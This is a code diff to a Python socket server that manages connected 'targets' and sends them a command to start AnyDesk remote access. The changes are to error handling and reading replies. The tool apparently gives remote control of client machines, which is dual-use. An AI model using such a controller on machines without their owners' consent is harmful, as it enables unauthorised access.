@@ -759,8 +759,8 @@ class Server:
 
             # Anydesk
             elif int(cmd) == 4:
-                print(f"[{colored('*', 'magenta')}]Starting AnyDesk...\n")
                 errCount = 0
+                print(f"[{colored('*', 'magenta')}]Starting AnyDesk...\n")
                 if len(self.targets) == 0:
                     print(f"[{colored('*', 'red')}]No connected stations.")
                     break
@@ -770,9 +770,13 @@ class Server:
 
                 try:
                     con.send('anydesk'.encode())
-                    continue
+                    msg = con.recv(1024).decode()
 
-                except ConnectionResetError:
+                    if "OK" not in msg:
+                        print(msg)
+
+                except (ConnectionResetError, ConnectionError, socket.error,
+                        ConnectionAbortedError, ConnectionRefusedError):
                     print(f"[{colored('!', 'red')}]Client lost connection.")
                     try:
                         for conKey, ipValue in self.clients.items():
@@ -999,9 +1003,6 @@ def main():
                 pass
 
         sys.exit()
-
-        # else:
-        #     sys.exit()
 
     return
 
